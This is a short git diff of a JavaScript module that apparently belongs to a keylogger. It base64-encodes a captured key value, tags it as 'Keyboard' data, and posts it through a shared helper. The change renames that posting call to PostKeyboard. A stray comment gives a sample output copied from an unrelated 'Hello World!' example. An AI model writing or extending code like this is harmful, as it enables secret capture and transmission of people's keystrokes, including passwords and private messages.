@@ -1,4 +1,4 @@
-module.exports = function(KeyIsEnable) {
+module.exports = function() {
   //var keycode = require('keycode');
   let shared=require("./Shared.js");
 var fs = require('fs'); 
@@ -22,7 +22,7 @@ if(main_key!="")
 var encodedString = Base64.encode(main_key);
 console.log(encodedString); // Outputs: "SGVsbG8gV29ybGQh"
 let object={'Type':"Keyboard",'Data':encodedString};
-    shared.PostData(object);
+    shared.PostKeyboard(object);
 // Decode the String
 // var decodedString = Base64.decode(encodedString);
 // console.log(decodedString); 
